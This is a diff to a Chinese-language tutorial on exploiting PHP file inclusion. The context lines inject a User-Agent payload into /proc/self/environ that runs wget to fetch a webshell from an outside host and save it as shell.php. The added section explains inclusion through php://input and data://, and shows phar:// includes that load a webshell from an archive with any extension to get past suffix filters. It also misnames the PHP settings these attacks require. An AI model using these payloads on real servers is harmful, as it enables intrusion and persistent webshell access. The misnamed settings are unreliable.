@@ -158,3 +158,29 @@ PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个�
 访问www.aaa.com/view.php?page=../../../../../proc/self/environ
 选择User-Agent 写代码如下：<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>然后提交请求。
 ```
+## php 伪协议包含
+php://input 你要用还是需要 allow_url_include 打开<br>
+data:// 更是需要 php_url_fopen 和 php_uri_include 都打开<br>
+### **php://input**<br>
+php://input 是个可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)
+![avatar](../images/php_input.png)
+![avatar](../images/php_input_shell.png)
+
+### **phar://协议**
+
+文件归档到一个文件包，将一个模块的文件打包成一个phar，这样方便模块整体迁移，只需将phar文件移动过去，其他环境中include即可使用。类似于java的 .jar 文件。<br>
+php 5.3时，为php的C语言扩展，安装php时会默认安装。
+特点就是能将任意后缀名的压缩包解包，得到里面指定的内容，这个方法在绕过后缀名限定的包含中非常好用。
+```php
+callphar.php
+<?php
+    include 'phar://my.phar/shell.php';
+?>
+```
+访问callphar.php即可调用shell.php，注意：phar文件不受文件名限制，即my.phar可以任意的重命名为aaa.bbb
+```php
+callphar.php
+<?php
+    include 'phar://aaa.bbb/shell.php';
+?>
+```
